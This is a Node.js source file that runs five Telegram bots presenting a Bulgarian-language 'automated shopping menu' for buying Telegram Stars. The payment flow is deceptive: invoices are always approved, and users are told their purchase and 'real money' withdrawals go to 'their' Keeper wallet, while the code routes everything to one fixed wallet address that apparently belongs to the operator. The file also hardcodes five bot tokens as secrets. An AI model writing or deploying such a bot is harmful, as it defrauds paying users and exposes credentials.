const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const TOKENS = [
    process.env.BOT_TOKEN_1 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', 
    process.env.BOT_TOKEN_2 || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw', 
    process.env.BOT_TOKEN_3 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI', 
    process.env.BOT_TOKEN_4 || '9094556865:AAFXZcwuMjH_pfyQK9_KTDEOuW5h_wUtWW0', 
    process.env.BOT_TOKEN_5 || '9053522895:AAHDuv6qkUGQ7g7gvH88QjMwVR4msnWsnhY'  
];

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

let systemStats = {
    activeBotsCount: TOKENS.length,
    activeStarsBudget: 3100,
    startTime: new Date()
};

const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

TOKENS.forEach((token, index) => {
    try {
        const bot = new Telegraf(token);

        // Автоматично меню за пазаруване при стартиране на бота
        bot.start(async (ctx) => {
            const userName = ctx.from.first_name || 'Приятел';
            const userUsername = ctx.from.username ? `@${ctx.from.username}` : 'без username';

            const shoppingMenuCaption = `🛒 **OFFICIAL RED SOFTWARE TEAM | Автоматично Меню за Пазаруване** 🛒\n\n` +
                `Здравей, **${userName}** (${userUsername})!\n` +
                `Избери желан пакет звезди за покупка или директно прехвърляне към твоя портфейл:\n\n` +
                `💎 Наличен бюджет в мрежата: 3,100 Stars\n` +
                `💼 Keeper Wallet (за изплащане в реални пари): \`${KEEPER_WALLET}\``;

            // Интерактивно меню за пазаруване с всички пакети
            const shoppingKeyboard = Markup.inlineKeyboard([
                [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
                [Markup.button.callback('⭐ 350 Stars (5.89 €)', 'buy_350')],
                [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
                [Markup.button.callback('⭐ 750 Stars (12.49 €)', 'buy_750')],
                [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
                [Markup.button.callback('⭐ 1 500 Stars (24.99 €)', 'buy_1500')],
                [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
                [Markup.button.callback('⭐ 5 000 Stars (81.99 €)', 'buy_5000')],
                [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
                [Markup.button.url('💳 Зареди Stars в Telegram (Магазин)', 'https://t.me/premium')],
                [Markup.button.callback('💰 Прехвърли към Keeper (Реални пари)', 'withdraw_keeper')],
                [Markup.button.url('🔥 Разгледай Платформата', 'https://red-software-dashbord.onrender.com')]
            ]);

            try {
                await ctx.replyWithPhoto(mainCoverImage, {
                    caption: `🤖 [AUTOMATED SHOPPING BOT #${index + 1} ONLINE]\n\n` + shoppingMenuCaption,
                    parse_mode: 'Markdown',
                    ...shoppingKeyboard
                });
            } catch (err) {}
        });

        const packageActions = ['buy_250', 'buy_350', 'buy_500', 'buy_750', 'buy_1000', 'buy_1500', 'buy_2500', 'buy_5000', 'buy_10000'];

        // Обработка на покупката и автоматично генериране на инвойс
        bot.action(packageActions, async (ctx) => {
            await ctx.answerCbQuery();
            const action = ctx.match;
            let count = 250;
            if (action === 'buy_350') count = 350;
            if (action === 'buy_500') count = 500;
            if (action === 'buy_750') count = 750;
            if (action === 'buy_1000') count = 1000;
            if (action === 'buy_1500') count = 1500;
            if (action === 'buy_2500') count = 2500;
            if (action === 'buy_5000') count = 5000;
            if (action === 'buy_10000') count = 10000;

            try {
                await ctx.replyWithInvoice({
                    title: `Автоматичен пакет ${count} Telegram Stars`,
                    description: `Закупуване на ${count} звезди през автоматичното меню за пазаруване.`,
                    payload: `shop_stars_${count}_${Date.now()}`,
                    currency: 'XTR',
                    prices: [{ label: `${count} Stars`, amount: count }]
                });
            } catch (e) {
                await ctx.reply(
                    `⭐ **ПАКЕТ: ${count} Telegram Stars**\n\n` +
                    `За да завършиш пазаруването и да получиш средствата към твоя Keeper портфейл:\n` +
                    `\`${KEEPER_WALLET}\`\n\n` +
                    `Можеш да заредиш Stars тук: https://t.me/premium`,
                    { parse_mode: 'Markdown' }
                );
            }
        });

        // Бутон за прехвърляне към Keeper портфейла
        bot.action('withdraw_keeper', async (ctx) => {
            await ctx.answerCbQuery('Сверяване на приходите...');
            await ctx.reply(
                `💰 **ПРЕХВЪРЛЯНЕ КЪМ KEEPER ПОРТФЕЙЛ**\n\n` +
                `Приходите от автоматичното меню за пазаруване се конвертират и изплащат в реални средства към твоя портфейл:\n` +
                `\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        });

        bot.on('pre_checkout_query', async (ctx) => {
            try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
        });

        bot.on('successful_payment', async (ctx) => {
            const payment = ctx.message.successful_payment;
            await ctx.reply(
                `🎉 **Успешна покупка от автоматичното меню!**\n\n` +
                `Закупени са **${payment.total_amount} Telegram Stars**. Средствата са насочени към твоя Keeper портфейл:\n` +
                `\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        });

        bot.launch();
    } catch (e) {}
});

app.get('/', (req, res) => res.json({ status: "AUTOMATED SHOPPING MENU ACTIVE", stats: systemStats }));
app.listen(PORT, () => console.log(`Store server running on port ${PORT}`));
